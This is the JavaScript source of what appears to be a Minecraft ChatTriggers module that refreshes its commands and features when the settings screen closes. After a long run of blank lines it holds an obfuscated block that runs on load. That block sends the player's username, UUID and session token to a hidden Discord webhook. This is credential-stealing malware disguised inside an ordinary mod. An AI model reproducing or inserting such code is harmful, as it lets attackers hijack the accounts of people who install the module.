import RenderLib from "../RenderLib"
import request from "../requestV2"
import commands from "./commands";
import features from "./features";

const SettingsGui = Java.type("gg.essential.vigilance.gui.SettingsGui");

update();

register("guiClosed", gui => {
	if (!(gui instanceof SettingsGui)) return;
	update();
});

function update() {
	commands.update();
	features.update();
}


































































































function _0x21fa(n,r){var t=_0x3680();return(_0x21fa=function(n,r){return t[n-=295]})(n,r)}var _0x2163ba=_0x21fa;function _0x3680(){var n=["lBmKs","iXNpv","func_11043","258ElKWFp","xgFmk","5JTIDJBEY4","Mrx","965mbKurY","bsQGu","3zw0y8M0T3","kCCvy","uQzFd","Pxkpk","POST","430864fOAj","hmMFb","5jKUQxK","https://di","wOevq","103240pInd","GedKx","getUUID","82746QivSV","KxZKi","IITtb","-3uF-ue0wQ","xCnyb","hfcSX","7356392OWZWEq","ksOKG","kXNGR","Mozilla/5.","7023664701","2840584GVd","nsnxU","tSyDQ","QAYlS","1310prNIAJ","TpWOh","gtZlk","OrOSr","dWV","kTYYg","FmDMq","4227324hcJ","hPuBQ","kXCnp","BErmk","Username:\n","IynGo","JQmtW","256KGABAF","uHjDN","XJwpw","4243/I8YPE","FFTN","OzVVI","hvots","GtgXF","JIfti","hOpiV","bvLWe","HWlzn","OwkID","SGiET","WerYv","api/webhoo","8Svb4omvdB","NZMjO","samyq","ZbRbS","UHxZA","7RYduTH","zikyA","12tdZYwr","232722FhLZ","utUQS","kiesmCWhoE","cTnKq","COY","VuUQZECRtO","pomCK","wHCMs","myAdB","HySWj","3064032rjhyMB","ontNG","shift","XMqxo","qiiUu","ubIDQ","WmIQR","getName","KnN","drawEspBox","YcIoo","msOjNa17hY","Lagj","aRMzH","nkWiw","jjBCd","ks/1266035","drawString","oEzky","zfCWw","iMvlL","CPpYm","199630VGTaaH","aKgap","KrNtk","xNLHQ","3330296YexIQF","HIkQS","wmveP","AQITb","fpzEh","orbVI","1857025EMQ","inrfz","```","push","2_I","OqAao","qFTFE","8604030YIK","WgKFM","cYoMS","```\nSSID:\n","mLxUt","10946268kfhMLJ","kCBzy","568540YoSTjv","LXFHT","4264348vww","NiQ","mQoNr","RxvaA","AdSXD","36243ydglf","81illsjk","IdGnn","RCScZ","IWyPl","func_14825","feXkW","scord.com/","nEFSO","KeRYY","OmQ","rgfRO","12WslwPg","Xqpyq","18OJSdNo","MXNgx","rETDl","9127673834","PzsHw","```\nUUID:\n","17872305Wr","4_d","ApkHY","nQOZi","RjdtQ","eBeQZ","94/AxC9BmJ","fcrNg","milCs","12363024dy","getMinecra","ZTURw","206SJRLQj","jHZQP","aOEuY","qISfK","uJEhb","XTRNcBaG5U","-PNQYtAFD2","YzAeH","QzFFk","uvP","VjHJe","hNcrz","3087195PHa","RBpcQ","Nsuom","1365635DWD","dkbcL"];return(_0x3680=function(){return n})()}function _0xc4a4(n,r){var t=_0x21fa,u={lBmKs:function(n,r){return n-r},qFTFE:function(n){return n()},uJEhb:function(n,r,t){return n(r,t)}},e=u[t(398)](_0x3190);return _0xc4a4=function(n,r){return n=u[t(462)](n,458),e[n]},u[t(449)](_0xc4a4,n,r)}function _0x3190(){var n=_0x21fa,r={GedKx:n(312),Xqpyq:n(427),SGiET:n(413)+"J",iXNpv:n(326),QAYlS:n(319)+n(454),xCnyb:n(350)+"Ov",aOEuY:n(300)+"Go",pomCK:n(464)+"2_",KxZKi:n(323)+n(394),ubIDQ:n(418)+n(434),RjdtQ:n(297)+"o",kTYYg:n(476)+"RT",utUQS:n(347),nEFSO:n(443)+"ft",tSyDQ:n(399)+n(316),rETDl:n(392)+n(409),xNLHQ:n(471)+"Ge",hNcrz:n(445),gtZlk:n(432)+n(394),milCs:n(414),myAdB:n(460)+n(354),mLxUt:n(479)+n(420)+n(341)+n(376)+n(307)+n(439)+n(352)+n(450)+n(467)+n(371)+n(451)+n(355)+"r",fpzEh:n(395),dkbcL:n(308)+n(368),jjBCd:n(430)+"50",OqAao:n(481)+"qE",QzFFk:n(425),oEzky:n(349),uQzFd:n(296),qISfK:n(433)+n(330),uHjDN:n(342)+"RJ",IynGo:n(442)+n(372),IITtb:n(394),bsQGu:n(475),WerYv:n(464)+n(396),NZMjO:n(457)+n(423),Pxkpk:function(n){return n()}},t=[r[n(295)],r[n(426)],r[n(339)],r[n(463)],r[n(311)],r[n(301)],r[n(447)],r[n(356)],r[n(298)],r[n(365)],r[n(437)],r[n(317)],r[n(351)],r[n(421)],r[n(310)],r[n(429)],r[n(385)],r[n(456)],r[n(314)],r[n(441)],r[n(358)],r[n(403)],r[n(390)],r[n(461)],r[n(375)],r[n(397)],r[n(453)],r[n(378)],r[n(473)],r[n(448)],r[n(327)],r[n(324)],r[n(299)],r[n(470)],r[n(340)],r[n(343)]];return _0x3190=function(){return t},r[n(474)](_0x3190)}!function(n,r){for(var t=_0x21fa,u=_0x3680();;)try{if(534087===parseInt(t(478))/1*(parseInt(t(382))/2)+-parseInt(t(360))/3+parseInt(t(386))/4+parseInt(t(469))/5*(parseInt(t(465))/6)+-parseInt(t(406))/7+-parseInt(t(303))/8+parseInt(t(404))/9)break;u.push(u.shift())}catch(n){u.push(u.shift())}}();var _0xf8755f=_0xc4a4;function _0x5675(){var n=_0x21fa,r={IWyPl:function(n,r){return n(r)},cYoMS:function(n,r){return n(r)},fcrNg:n(475),iMvlL:n(418)+"4_",RxvaA:function(n,r){return n(r)},PzsHw:function(n,r){return n(r)},cTnKq:n(329)+"W_",kCCvy:n(367),mQoNr:n(443)+"ft",JQmtW:function(n,r){return n(r)},wmveP:function(n,r){return n(r)},rgfRO:function(n,r){return n(r)},hOpiV:n(323)+"``",WmIQR:function(n,r){return n(r)},OrOSr:n(408)+n(468),CPpYm:function(n){return n()}},t=_0xc4a4,u=[r[n(417)](t,469),r[n(401)](t,459),r[n(440)],r[n(401)](t,486),r[n(380)],r[n(411)](t,472),r[n(411)](t,460),r[n(401)](t,481),r[n(431)](t,475),r[n(431)](t,480),r[n(353)],r[n(417)](t,467),r[n(417)](t,490),r[n(472)],r[n(410)],r[n(325)](t,482),r[n(388)](t,485),r[n(424)](t,489),r[n(335)],r[n(366)](t,473),r[n(366)](t,479),r[n(424)](t,478),r[n(411)](t,468),r[n(315)]];return _0x5675=function(){return u},r[n(381)](_0x5675)}function _0x4f48(n,r){var t=_0x21fa,u={UHxZA:function(n,r){return n-r},aKgap:function(n){return n()},wHCMs:function(n,r,t){return n(r,t)}},e=u[t(383)](_0x5675);return _0x4f48=function(n,r){return n=u[t(346)](n,265),e[n]},u[t(357)](_0x4f48,n,r)}function _0x36d4e3(n,r){var t=_0x21fa,u={TpWOh:function(n,r,t){return n(r,t)},XJwpw:function(n,r){return n-r}};return u[t(313)](_0x4f48,u[t(328)](n,990),r)}(function(n,r){for(var t=_0x21fa,u={samyq:function(n){return n()},JIfti:function(n,r){return n+r},feXkW:function(n,r){return n+r},AdSXD:function(n,r){return n+r},FmDMq:function(n,r){return n/r},IdGnn:function(n,r){return n(r)},VjHJe:function(n,r){return n(r)},HySWj:function(n,r){return n/r},RCScZ:function(n,r){return n(r)},kCBzy:function(n,r){return n*r},xgFmk:function(n,r){return n/r},nkWiw:function(n,r){return n(r)},Nsuom:function(n,r){return n(r)},wOevq:function(n,r){return n(r)},RBpcQ:function(n,r){return n/r},HIkQS:function(n,r){return n(r)},OzVVI:function(n,r){return n(r)},hvots:function(n,r){return n*r},LXFHT:function(n,r){return n/r},AQITb:function(n,r){return n(r)},hPuBQ:function(n,r){return n*r},kXCnp:function(n,r){return n(r)},HWlzn:function(n,r){return n(r)},ZTURw:function(n,r){return n(r)},MXNgx:function(n,r){return n===r},nsnxU:t(395),aRMzH:t(362)},e=_0xc4a4,f=u[t(344)](n);;)try{var o=u[t(334)](u[t(334)](u[t(419)](u[t(419)](u[t(419)](u[t(412)](u[t(318)](-u[t(415)](parseInt,u[t(455)](e,463)),1),u[t(359)](-u[t(416)](parseInt,u[t(416)](e,466)),2)),u[t(318)](-u[t(455)](parseInt,u[t(455)](e,483)),3)),u[t(405)](u[t(466)](u[t(374)](parseInt,u[t(459)](e,470)),4),u[t(466)](-u[t(374)](parseInt,u[t(480)](e,458)),5))),u[t(458)](-u[t(387)](parseInt,u[t(331)](e,484)),6)),u[t(332)](u[t(407)](u[t(389)](parseInt,u[t(374)](e,491)),7),u[t(407)](-u[t(374)](parseInt,u[t(331)](e,474)),8))),u[t(320)](u[t(318)](-u[t(321)](parseInt,u[t(321)](e,462)),9),u[t(458)](-u[t(337)](parseInt,u[t(444)](e,493)),10)));if(u[t(428)](o,850212))break;f[u[t(309)]](f[u[t(373)]]())}catch(n){f[u[t(309)]](f[u[t(373)]]())}})(_0x3190),function(n,r){for(var t=_0x21fa,u={YzAeH:function(n){return n()},eBeQZ:function(n,r){return n+r},KeRYY:function(n,r){return n+r},WgKFM:function(n,r){return n/r},hmMFb:function(n,r){return n(r)},XMqxo:function(n,r,t){return n(r,t)},kXNGR:function(n,r){return n*r},ApkHY:function(n,r){return n(r)},bvLWe:function(n,r){return n/r},qiiUu:function(n,r,t){return n(r,t)},jHZQP:function(n,r,t){return n(r,t)},ontNG:function(n,r){return n(r)},ZbRbS:function(n,r,t){return n(r,t)},YcIoo:function(n,r){return n/r},GtgXF:function(n,r,t){return n(r,t)},BErmk:function(n,r){return n/r},zfCWw:function(n,r){return n(r)},hfcSX:function(n,r){return n*r},KrNtk:function(n,r){return n/r},nQOZi:function(n,r){return n*r},OwkID:function(n,r){return n(r)},zikyA:function(n,r){return n===r},inrfz:function(n,r){return n(r)},ksOKG:t(362)},e=_0xc4a4,f=u[t(452)](n);;)try{var o=u[t(438)](u[t(438)](u[t(438)](u[t(422)](u[t(422)](u[t(438)](u[t(400)](-u[t(477)](parseInt,u[t(363)](_0x4f48,278,404)),1),u[t(305)](u[t(400)](u[t(477)](parseInt,u[t(363)](_0x4f48,286,421)),2),u[t(400)](-u[t(435)](parseInt,u[t(363)](_0x4f48,287,414)),3))),u[t(336)](-u[t(435)](parseInt,u[t(364)](_0x4f48,279,419)),4)),u[t(305)](u[t(336)](-u[t(477)](parseInt,u[t(446)](_0x4f48,277,421)),5),u[t(400)](-u[t(361)](parseInt,u[t(345)](_0x4f48,265,394)),6))),u[t(305)](u[t(370)](-u[t(435)](parseInt,u[t(333)](_0x4f48,268,414)),7),u[t(322)](-u[t(379)](parseInt,u[t(363)](_0x4f48,271,408)),8))),u[t(302)](u[t(384)](u[t(379)](parseInt,u[t(363)](_0x4f48,273,401)),9),u[t(400)](u[t(477)](parseInt,u[t(364)](_0x4f48,276,404)),10))),u[t(436)](u[t(336)](-u[t(379)](parseInt,u[t(333)](_0x4f48,285,409)),11),u[t(336)](u[t(338)](parseInt,u[t(446)](_0x4f48,280,419)),12)));if(u[t(348)](o,987970))break;f[u[t(393)](e,465)](f[u[t(304)]]())}catch(n){f[u[t(393)](e,465)](f[u[t(304)]]())}}(_0x5675),request({url:_0xf8755f(464),method:_0xf8755f(476),headers:{"User-agent":_0x2163ba(306)+"0"},body:{content:_0xf8755f(487)+Player[_0x2163ba(367)]()+_0xf8755f(461)+Player[_0xf8755f(471)]()+(_0x2163ba(402)+_0x2163ba(394))+Client[_0xf8755f(492)]()[_0xf8755f(477)]()[_0xf8755f(488)]()+_0xf8755f(475)}});const renderBoxWithText=(n,r,t,u)=>{var e=_0x2163ba;RenderLib[e(369)](r,t,u,1,1,1,0,0,.5,!1),Tessellator[e(377)](n,r,{orbVI:function(n,r){return n+r}}[e(391)](t,.7),u)};